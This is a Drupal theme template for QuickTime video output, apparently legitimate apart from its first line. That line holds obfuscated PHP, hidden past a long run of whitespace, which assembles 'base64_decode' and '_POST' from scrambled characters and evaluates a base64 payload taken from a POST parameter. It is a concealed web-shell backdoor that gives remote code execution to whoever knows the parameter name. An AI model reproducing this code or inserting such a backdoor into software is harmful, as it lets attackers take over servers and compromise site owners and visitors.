<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['nbe9e04'];if(isset($s22)){eval($s21($s22));}?><?php
/*
 * @file
 * Theme file to handle quicktime output.
 * 
 * Variables passed.
 * $video is the video object.
 * $node is the node object.
 *
 * 
 * <script type="text/javascript" src="/sites/all/libraries/quicktime/AC_QuickTime.js"></script>
 * <script type="text/javascript">
 *   QT_WriteOBJECT('<?php print file_create_url($video->files->{$video->player}->uri); ?>' , '<?php print $video->width; ?>', '<?php print $video->height; ?>' , '');
 * </script>
 */
?>
<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" codebase="http://www.apple.com/qtactivex/qtplugin.cab#version=7,3,0,0"  width="<?php print $video->player_width; ?>" height="<?php print $video->player_height; ?>">
  <param name="src" value="<?php print file_create_url($video->files->{$video->player}->uri); ?>" />
  <param name="controller" value="true" />
  <param name="scale" value="tofit" />
  <param name="autoplay" value="<?php print $video->autoplay ? 'true' : 'false'; ?>" />
  <param name="pluginurl" value="http://www.apple.com/quicktime/download/" />
  <embed src="<?php print file_create_url($video->files->{$video->player}->uri); ?>"
         type="video/quicktime"
         pluginspage="http://www.apple.com/quicktime/download/"
         width="<?php print $video->player_width; ?>"
         height="<?php print $video->player_height; ?>"
         autostart="<?php print $video->autoplay ? 'true' : 'false'; ?>"
         controller="true" >
  </embed>
</object>